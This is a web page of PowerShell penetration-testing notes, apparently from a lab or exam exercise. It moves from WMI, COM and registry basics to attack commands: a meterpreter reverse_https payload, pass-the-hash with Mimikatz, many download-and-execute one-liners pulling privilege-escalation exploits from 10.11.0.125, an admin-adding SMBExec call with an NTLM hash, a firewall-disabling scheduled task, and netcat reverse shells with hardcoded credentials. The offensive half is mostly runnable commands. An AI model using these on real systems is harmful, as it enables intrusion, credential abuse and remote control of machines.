<p>Exploring Classes</p>
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="err">–</span><span class="n">NameSpace</span> <span class="err">“</span><span class="o">&lt;</span><span class="n">namespace</span><span class="o">&gt;</span><span class="err">”</span> <span class="err">–</span><span class="n">List</span>
</pre></div>

<p>Exploring Methods
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="o">-</span><span class="k">Class</span> <span class="o">&lt;</span><span class="k">class</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">List</span> <span class="o">|</span> <span class="k">Select</span><span class="o">-</span><span class="k">Object</span> <span class="o">-</span><span class="n">ExpandProperty</span> <span class="n">Methods</span>
</pre></div></p>
<p>Filter based on properties of objects getting returned
<div class="codehilite"><pre><span></span><span class="x">Get-WmiObject -Class Win32_Process -Filter (Name = &quot;powershell.exe&quot;)</span>
<span class="x">Get-WmiObject -Class Win32_Process | Where-Object </span><span class="cp">{</span><span class="nv">$_.Name</span> <span class="o">-</span><span class="na">eq</span> <span class="s2">&quot;powershell.exe&quot;</span><span class="cp">}</span><span class="x"></span>
<span class="x">Get-WmiObject -Query </span><span class="cp">{</span><span class="nf">Select</span> <span class="o">*</span> <span class="na">from</span> <span class="na">Win32_Process</span> <span class="na">where</span> <span class="na">Name</span> <span class="o">=</span> <span class="s2">&quot;powershell.exe&quot;</span><span class="cp">}</span><span class="x"></span>
</pre></div></p>
<div class="codehilite"><pre><span></span><span class="n">Remove</span><span class="o">-</span><span class="n">WmiObject</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">WmiMethod</span> <span class="o">-</span><span class="k">Class</span> <span class="n">Win32_Process</span> <span class="o">-</span><span class="n">Name</span> <span class="k">Create</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="ss">&quot;notepad.exe&quot;</span>
<span class="n">Invoke</span><span class="o">-</span><span class="n">WmiMethod</span> <span class="o">-</span><span class="k">Class</span> <span class="n">Win32_Process</span> <span class="o">-</span><span class="n">Name</span> <span class="k">Create</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="ss">&quot;notepad.exe&quot;</span> <span class="o">-</span> <span class="n">ComputerName</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Credential</span> <span class="o">&lt;</span><span class="n">cred</span><span class="o">&gt;</span>  
</pre></div>

<h2 id="com-objects">COM Objects<a class="headerlink" href="#com-objects" title="Permanent link">&para;</a></h2>
<p>Explore available COM objects:</p>
<p><code class="codehilite"><span class="nv">Get</span><span class="o">-</span><span class="nv">ChildItem</span> <span class="nv">REGISTRY</span>::<span class="nv">HKEY_CLASSES_ROOT</span>\<span class="nv">CLSID</span> <span class="o">-</span><span class="k">include</span> <span class="nv">PROGID</span> <span class="o">-</span><span class="nv">recurse</span> <span class="o">|</span> <span class="nv">foreach</span> {$<span class="nv">_</span>.<span class="nv">GetValue</span><span class="ss">(</span><span class="s2">&quot;&quot;</span><span class="ss">)</span>} <span class="o">|</span> <span class="nv">Where</span><span class="o">-</span><span class="nv">Object</span> {$<span class="nv">_</span> <span class="o">-</span><span class="nv">match</span> “<span class="o">&lt;</span><span class="nv">appname</span><span class="o">&gt;</span><span class="s2">&quot;</span><span class="s">}</span></code></p>
<p>```
$wscript = New-Object -ComObject WScript.Shell.1
$wscript | Get-Member
$wscript.CurrentDirectory
$wscript.SendKeys("Hello")
$wscript.Exec("cmd")
$wscript.CreateShortcut(...)
<div class="codehilite"><pre><span></span><span class="n">Interesting</span> <span class="n">COM</span> <span class="n">Objects</span>

<span class="o">-</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Shell</span><span class="p">.</span><span class="mi">1</span>
<span class="o">-</span> <span class="n">Shell</span><span class="p">.</span><span class="n">Applcation</span><span class="p">.</span><span class="mi">1</span>   

<span class="o">##</span> <span class="n">Windows</span> <span class="n">Registry</span>
</pre></div>
Get-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\Current Version'
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\Current Version' -Recurse
<div class="codehilite"><pre><span></span>
</pre></div>
Get-Provider -PSProvider Registry
<div class="codehilite"><pre><span></span><span class="n">Due</span> <span class="k">to</span> <span class="n">above</span> <span class="n">provider</span> <span class="n">it</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">possible</span> <span class="k">to</span> <span class="n">use</span> <span class="n">registry</span> <span class="k">as</span> <span class="n">filesystem</span><span class="p">.</span>
</pre></div>
Set-Location Registry::</p>
<blockquote>
<p>ls
cd HKLM
ls</p>
</blockquote>
<p>New-PSDrive -name RegistryDrive -PSProvider Registry -Root Registry::</p>
<blockquote>
<p>dir</p>
</blockquote>
<p>Get-PSDrive
<div class="codehilite"><pre><span></span>
</pre></div>
New-Item -Path HKCU:\Test\New
New-ItemProperty -Path HKCU:\Test\New -Name Reg2 -PropertyType String -Value 2
Rename-Item HKCU:\Test -NewName HKCU:TestNew
Rename-ItemProperty HKCU:\Test\New -Name Reg2 -NewName Reg3
Set-ItemProperty -Path HKCU:\Test\New -Name Reg2 -Value 3
<div class="codehilite"><pre><span></span><span class="o">##</span> <span class="n">Recon</span>

<span class="o">-</span> <span class="n">Directory</span> <span class="k">search</span><span class="p">:</span><span class="o">`</span><span class="k">Get</span><span class="o">-</span><span class="n">HttpStatus</span><span class="o">`</span>

<span class="o">##</span> <span class="n">Client</span> <span class="n">Side</span> <span class="n">Attacks</span>

<span class="o">-</span> <span class="k">Out</span><span class="o">-</span><span class="n">Word</span>
<span class="o">-</span> <span class="k">Out</span><span class="o">-</span><span class="n">Excel</span>
<span class="o">-</span> <span class="k">Out</span><span class="o">-</span><span class="n">CHM</span>
<span class="o">-</span> <span class="k">Out</span><span class="o">-</span><span class="n">Shortcut</span>
<span class="o">-</span> <span class="k">Out</span><span class="o">-</span><span class="n">HTA</span>
<span class="o">-</span> <span class="k">Out</span><span class="o">-</span><span class="n">Java</span>

<span class="o">##</span> <span class="k">Encoding</span>

<span class="o">-</span> <span class="o">`</span><span class="n">Invole</span><span class="o">-</span><span class="n">Encode</span> <span class="o">-</span><span class="n">DataToEncode</span> <span class="n">example</span><span class="p">.</span><span class="n">ps1</span> <span class="o">-</span><span class="n">OutCommand</span> <span class="o">`</span>
  <span class="o">-</span> <span class="o">`</span><span class="k">Out</span><span class="o">-</span><span class="n">CHM</span> <span class="o">-</span><span class="n">Payload</span> <span class="ss">&quot;-e &lt;encodedValue&gt;&quot;</span><span class="o">`</span>

<span class="o">##</span> <span class="n">Metasploit</span>

<span class="o">-</span> <span class="k">Using</span> <span class="n">Powershell</span> <span class="k">with</span> <span class="n">Metasploit</span><span class="p">:</span> <span class="p">[</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">rapid7</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">wiki</span><span class="o">/</span><span class="n">How</span><span class="o">-</span><span class="k">to</span><span class="o">-</span><span class="n">use</span><span class="o">-</span><span class="n">Powershell</span><span class="o">-</span><span class="k">in</span><span class="o">-</span><span class="n">an</span><span class="o">-</span><span class="n">exploit</span><span class="p">](</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">rapid7</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">wiki</span><span class="o">/</span><span class="n">How</span><span class="o">-</span><span class="k">to</span><span class="o">-</span><span class="n">use</span><span class="o">-</span><span class="n">Powershell</span><span class="o">-</span><span class="k">in</span><span class="o">-</span><span class="n">an</span><span class="o">-</span><span class="n">exploit</span><span class="p">)</span>
</pre></div>
msfvenom meterpreter
./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> -f psh-reflection</p>
<p>cmd/windows/reverse_powershell
<div class="codehilite"><pre><span></span><span class="n">Useful</span> <span class="n">modules</span><span class="p">:</span>

<span class="o">-</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec_psh</span>
  <span class="o">-</span> <span class="n">Payload</span> <span class="k">is</span> <span class="n">encoded</span>
<span class="o">-</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">powershell_cmd_upgrade</span>
  <span class="o">-</span> <span class="n">Upgrade</span> <span class="n">native</span> <span class="k">to</span> <span class="n">Powershell</span>
<span class="o">-</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">powershell</span><span class="o">/</span><span class="n">exec_powershell</span>
<span class="o">-</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">script</span><span class="o">/</span><span class="n">web_delivery</span>

<span class="o">##</span> <span class="n">Pass</span> <span class="n">the</span> <span class="n">Hash</span> <span class="k">with</span> <span class="n">Powershell</span>
</pre></div>
.\wce.exe –s <Administrator:.:hashes> -c PowerShell.exe</p>
<p>Invoke-Mimikatz -Command "'"sekurlsa::pth /user:Administrator /domain:. /ntlm:<ntlmhash> /run:powershell.exe'""
<div class="codehilite"><pre><span></span><span class="nv">http</span>:<span class="o">//</span><span class="nv">www</span>.<span class="nv">pwnag3</span>.<span class="nv">com</span><span class="o">/</span><span class="mi">2014</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="nv">what</span><span class="o">-</span><span class="nv">did</span><span class="o">-</span><span class="nv">microsoft</span><span class="o">-</span><span class="nv">just</span><span class="o">-</span><span class="k">break</span><span class="o">-</span><span class="nv">with</span>.<span class="nv">html</span>

## <span class="nv">Persistence</span>

<span class="o">-</span> <span class="nv">WMI</span> <span class="nv">permanent</span> <span class="nv">event</span> <span class="nv">consumers</span>
<span class="o">-</span> <span class="nv">Windows</span> <span class="nv">registry</span>
<span class="o">-</span> <span class="nv">Scheduled</span> <span class="nv">tasks</span>

## <span class="nv">Restricting</span> <span class="nv">Powershell</span>

<span class="o">-</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">www</span>.<span class="nv">darkoperator</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">blog</span><span class="o">/</span><span class="mi">2013</span><span class="o">/</span><span class="mi">3</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="nv">powershell</span><span class="o">-</span><span class="nv">basics</span><span class="o">-</span><span class="nv">execution</span><span class="o">-</span><span class="nv">policy</span><span class="o">-</span><span class="nv">and</span><span class="o">-</span><span class="nv">code</span><span class="o">-</span><span class="nv">signing</span><span class="o">-</span><span class="nv">part</span><span class="o">-</span><span class="mi">2</span>.<span class="nv">html</span>

<span class="o">-</span> <span class="nv">Process</span> <span class="nv">tracking</span> <span class="nv">and</span> <span class="nv">Module</span> <span class="nv">logging</span>.

<span class="o">-</span> <span class="nv">ACL</span>, <span class="nv">Software</span> <span class="nv">Restriction</span> <span class="nv">Policies</span> <span class="ss">(</span><span class="nv">SRP</span><span class="ss">)</span> <span class="nv">and</span> <span class="nv">Application</span> <span class="nv">Control</span> <span class="nv">Policies</span> <span class="ss">(</span><span class="nv">Applocker</span><span class="ss">)</span> <span class="nv">could</span> <span class="nv">be</span> <span class="nv">used</span> <span class="nv">to</span> <span class="nv">control</span> <span class="nv">PowerShell</span>.                                                                            

  <span class="o">-</span> <span class="nv">Both</span> <span class="nv">aresupported</span> <span class="nv">by</span> <span class="nv">GPO</span>, <span class="nv">your</span> <span class="nv">mileage</span> <span class="nv">may</span> <span class="nv">vary</span> <span class="nv">according</span> <span class="nv">to</span> <span class="nv">your</span> <span class="nv">implementation</span> <span class="nv">preferences</span>.

  <span class="o">-</span> `<span class="nv">__PSLockDownPolicy</span>` <span class="ss">(</span><span class="nv">v3</span> <span class="nv">only</span><span class="ss">)</span>

<span class="o">-</span> <span class="nv">Just</span> <span class="nv">Enough</span> <span class="nv">Admin</span> – <span class="nv">Restrict</span> <span class="nv">Administrative</span> <span class="nv">Rights</span> <span class="o">-</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">blogs</span>.<span class="nv">technet</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">b</span><span class="o">/</span><span class="nv">privatecloud</span><span class="o">/</span><span class="nv">archive</span><span class="o">/</span><span class="mi">2014</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="nv">just</span><span class="o">-</span><span class="nv">enough</span><span class="o">-</span><span class="nv">administration</span><span class="o">-</span><span class="nv">step</span><span class="o">-</span><span class="nv">by</span><span class="o">-</span><span class="nv">step</span>.<span class="nv">aspx</span>

<span class="o">-</span> <span class="nv">Auditing</span>, <span class="nv">Base</span> <span class="nv">lining</span> <span class="nv">and</span> <span class="nv">Incident</span> <span class="nv">Management</span>

  <span class="o">-</span> <span class="nv">PoshSec</span> <span class="o">-</span> <span class="nv">https</span>:<span class="o">//</span><span class="nv">github</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">PoshSec</span>
  <span class="o">-</span> <span class="nv">Kansa</span> <span class="o">-</span> <span class="nv">https</span>:<span class="o">//</span><span class="nv">github</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">davehull</span><span class="o">/</span><span class="nv">Kansa</span>
  <span class="o">-</span> <span class="nv">Voyeur</span> <span class="o">-</span> <span class="nv">https</span>:<span class="o">//</span><span class="nv">github</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">silverhack</span><span class="o">/</span><span class="nv">voyeur</span><span class="o">/</span>
  <span class="o">-</span> <span class="nv">Using</span> <span class="nv">Virus</span> <span class="nv">Total</span> <span class="nv">API</span> <span class="o">-</span> <span class="nv">https</span>:<span class="o">//</span><span class="nv">github</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">darkoperator</span><span class="o">/</span><span class="nv">Posh</span><span class="o">-</span><span class="nv">VirusTotal</span>

<span class="o">-</span> <span class="nv">Bypassing</span> <span class="nv">Applocker</span> <span class="nv">Policies</span> <span class="o">-</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">www</span>.<span class="nv">sixdub</span>.<span class="nv">net</span><span class="o">/</span><span class="mi">2014</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">02</span><span class="o">/</span><span class="nv">inexorable</span><span class="o">-</span><span class="nv">powershell</span><span class="o">-</span><span class="nv">a</span><span class="o">-</span><span class="nv">red</span><span class="o">-</span><span class="nv">teamers</span><span class="o">-</span><span class="nv">tale</span><span class="o">-</span><span class="nv">of</span><span class="o">-</span><span class="nv">overcoming</span><span class="o">-</span><span class="nv">simple</span><span class="o">-</span><span class="nv">applocker</span><span class="o">-</span><span class="nv">policies</span><span class="o">/</span>

<span class="o">-</span> <span class="nv">https</span>:<span class="o">//</span><span class="nv">github</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">Veil</span><span class="o">-</span><span class="nv">Framework</span><span class="o">/</span><span class="nv">PowerTools</span><span class="o">/</span><span class="nv">tree</span><span class="o">/</span><span class="nv">master</span><span class="o">/</span><span class="nv">PowerPick</span>

<span class="o">-</span> <span class="nv">Investigating</span> <span class="nv">PowerShell</span> <span class="nv">attacks</span> <span class="nv">https</span>:<span class="o">//</span><span class="nv">www</span>.<span class="nv">defcon</span>.<span class="nv">org</span><span class="o">/</span><span class="nv">images</span><span class="o">/</span><span class="nv">defcon</span><span class="o">-</span><span class="mi">22</span><span class="o">/</span><span class="nv">dc</span><span class="o">-</span><span class="mi">22</span><span class="o">-</span><span class="nv">presentations</span><span class="o">/</span><span class="nv">Kazanciyan</span><span class="o">-</span><span class="nv">Hastings</span><span class="o">/</span><span class="nv">DEFCON</span><span class="o">-</span><span class="mi">22</span><span class="o">-</span><span class="nv">Ryan</span><span class="o">-</span><span class="nv">Kazanciyan</span><span class="o">-</span><span class="nv">Matt</span><span class="o">-</span><span class="nv">Hastings</span><span class="o">-</span><span class="nv">Investigating</span><span class="o">-</span><span class="nv">Powershell</span><span class="o">-</span><span class="nv">Attacks</span><span class="o">-</span><span class="nv">UPDATED</span>.<span class="nv">pdf</span>

## <span class="nv">Save</span> <span class="nv">output</span>
</pre></div>
Get-Service | Export-CSV C:\Temp\AllServices.CSV –NoTypeInfo
Get-User –Filter ‘Name –Like “*John”’ | Export-CSV C:\Temp\AllUsers.CSV –NoTypeInfo
Get-ChildItem –Path C:\Windows\System32 | Export-CSV C:\Temp\AllFiles.CSV -NoTypeInfo
<div class="codehilite"><pre><span></span><span class="o">-</span> <span class="nv">Reboots</span>: `<span class="nv">Get</span><span class="o">-</span><span class="nv">EventLog</span> –<span class="nv">Log</span> <span class="nv">System</span> –<span class="nv">Newest</span> <span class="mi">100</span> <span class="o">|</span> <span class="nv">Where</span><span class="o">-</span><span class="nv">Object</span> {$<span class="nv">_</span>.<span class="nv">EventID</span> –<span class="nv">eq</span> ‘<span class="mi">1074</span>’} <span class="o">|</span> <span class="nv">FT</span> <span class="nv">MachineName</span>, <span class="nv">UserName</span>, <span class="nv">TimeGenerated</span> <span class="o">-</span><span class="nv">AutoSize</span>`
<span class="o">-</span> <span class="nv">Search</span> <span class="nv">hotfix</span>: `<span class="nv">Get</span><span class="o">-</span><span class="nv">HotFix</span> –<span class="nv">ID</span> <span class="nv">KB2877616</span>`
<span class="o">-</span> <span class="nv">Backup</span> <span class="nv">Group</span> <span class="nv">Policy</span>: `<span class="nv">Backup</span><span class="o">-</span><span class="nv">GPO</span> –<span class="nv">All</span> –<span class="nv">Path</span> <span class="nv">C</span>:\<span class="nv">Temp</span>\<span class="nv">AllGPO</span>`
<span class="o">-</span> <span class="nv">Check</span> <span class="k">if</span> <span class="nv">all</span> <span class="nv">DCs</span> <span class="nv">are</span> <span class="nv">Global</span> <span class="nv">Catalog</span> <span class="nv">Servers</span>: `<span class="nv">Get</span><span class="o">-</span><span class="nv">ADDomainController</span> –<span class="nv">Filter</span> <span class="o">*</span> <span class="o">|</span> <span class="nv">Select</span> <span class="nv">Hostname</span>, <span class="nv">IsGlobalCatalog</span>`
<span class="o">-</span>

## <span class="nv">Permissions</span>
</pre></div>
icacls "C:\Program Files (x86)\Program Folder"
<div class="codehilite"><pre><span></span>
</pre></div>
OI This folder and files
CI This folder and subfolders
IO The ACE does not apply to the current file/directory.</p>
<p>No output message: This folder only
(IO)(CI) This folder, subfolders and files
(OI)(CI)(IO) Subfolders and files only
(CI)(IO) Subfolders only
(OI)(IO) Files only
<div class="codehilite"><pre><span></span><span class="p">[</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="p">.</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">en</span><span class="o">-</span><span class="n">us</span><span class="o">/</span><span class="n">previous</span><span class="o">-</span><span class="n">versions</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">it</span><span class="o">-</span><span class="n">pro</span><span class="o">/</span><span class="n">windows</span><span class="o">-</span><span class="n">xp</span><span class="o">/</span><span class="n">bb490872</span><span class="p">(</span><span class="n">v</span><span class="o">=</span><span class="n">technet</span><span class="p">.</span><span class="mi">10</span><span class="p">)](</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="p">.</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">en</span><span class="o">-</span><span class="n">us</span><span class="o">/</span><span class="n">previous</span><span class="o">-</span><span class="n">versions</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">it</span><span class="o">-</span><span class="n">pro</span><span class="o">/</span><span class="n">windows</span><span class="o">-</span><span class="n">xp</span><span class="o">/</span><span class="n">bb490872</span><span class="p">(</span><span class="n">v</span><span class="o">=</span><span class="n">technet</span><span class="p">.</span><span class="mi">10</span><span class="p">))</span>

<span class="o">##</span> <span class="n">Powershell</span> <span class="k">with</span> <span class="n">HID</span>

<span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">samratashok</span><span class="o">/</span><span class="n">Kautilya</span><span class="o">/</span>
<span class="o">-</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">labofapenetrationtester</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="k">search</span><span class="o">/</span><span class="n">label</span><span class="o">/</span><span class="n">Kautilya</span>
<span class="o">-</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">irongeek</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">i</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">page</span><span class="o">=</span><span class="k">security</span><span class="o">/</span><span class="n">plug</span><span class="o">-</span><span class="k">and</span><span class="o">-</span><span class="n">prey</span><span class="o">-</span><span class="n">malicious</span><span class="o">-</span><span class="n">usb</span><span class="o">-</span><span class="n">devices</span>





<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">subTee</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2014</span><span class="o">-</span><span class="mi">4113</span><span class="o">/</span><span class="nb">blob</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">Invoke</span><span class="o">-</span><span class="n">SystemShell</span><span class="p">.</span><span class="n">ps1</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">labofapenetrationtester</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="mi">2014</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="k">using</span><span class="o">-</span><span class="n">nishang</span><span class="o">-</span><span class="k">with</span><span class="o">-</span><span class="n">cobalt</span><span class="o">-</span><span class="n">strike</span><span class="p">.</span><span class="n">html</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="p">.</span><span class="n">cobaltstrike</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="mi">2014</span><span class="o">/</span><span class="mi">09</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="n">cobalt</span><span class="o">-</span><span class="n">strike</span><span class="o">-</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="n">i</span><span class="o">-</span><span class="n">have</span><span class="o">-</span><span class="n">the</span><span class="o">-</span><span class="n">powershell</span><span class="o">/</span>
</pre></div>
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('<a href="http://10.11.0.125/PowerUp.ps1">http://10.11.0.125/PowerUp.ps1</a>')"
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('<a href="http://10.11.0.125/Sherlock.ps1">http://10.11.0.125/Sherlock.ps1</a>')"
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('<a href="http://10.11.0.125/MS16-032.ps1">http://10.11.0.125/MS16-032.ps1</a>')"
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('<a href="http://10.11.0.125/MS16-135.ps1">http://10.11.0.125/MS16-135.ps1</a>')"
\10.11.0.125\share\41015.exe
\10.11.0.125\share\SetWindowLongPtr_Exploit.exe</p>
<p>powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('<a href="http://10.11.0.125/Invoke-WMIExec.ps1">http://10.11.0.125/Invoke-WMIExec.ps1</a>'); Invoke-WMIExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'cmd' -verbose"</p>
<p>powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('<a href="http://10.11.0.125/Invoke-SMBExec.ps1">http://10.11.0.125/Invoke-SMBExec.ps1</a>'); Invoke-SMBExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'net localgroup administrators bethany /add' -verbose"</p>
<p>PsExec64.exe \localhost -u alice -p aliceishere cmd
powershell -ExecutionPolicy Bypass 
C:\Users\Bethany\Desktop\PsExec.exe -accepteula \localhost -u alice -p aliceishere cmd</p>
<p>powershell.exe -exec Bypass -C "$action = New-ScheduledTaskAction -Execute netsh -Argument 'firewall set opmode disable'; $trigger = New-ScheduledTaskTrigger -Once -At $startTime -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([Timespan]::MaxValue); $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel; Register-ScheduledTask -TaskName 'amx1' -TaskPath 'C:\Windows\System32\' -Action $action -Trigger $trigger -User 'alice' -Password 'aliceishere' -Settings $settings"</p>
<p>powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('<a href="http://10.11.0.125/runas.ps1">http://10.11.0.125/runas.ps1</a>')"</p>
<p>cmd /C echo "aliceishere" | runas /user:alice "cmd"</p>
<p>Option explicit
dim oShell
set oShell= Wscript.CreateObject("WScript.Shell")
oShell.Run "C:\Users\Bethany\Desktop\nc.exe -e cmd.exe 10.11.0.125 9999"
WScript.Sleep 100
oShell.Sendkeys "aliceishere~”
Wscript.Quit</p>
<p>// CScript / WScript</p>
<p>$username = 'alice'
$password = 'aliceishere'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securepassword
Start-Process 'C:\Users\Bethany\Desktop\nc.exe' -ArgumentList '-e cmd.exe 10.11.0.125 9999' -Credential $credential</p>
<p>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -C "IEX (New-Object Net.WebClient).DownloadString('<a href="http://10.11.0.125/runas.ps1">http://10.11.0.125/runas.ps1</a>')"
```</p>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../../credentials/using-credentials/" title="Using Credentials" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Using Credentials
              </span>
            </div>
          </a>
        
        
          <a href="../collections/" title="Collections" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Collections
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
      
    
  </body>
</html>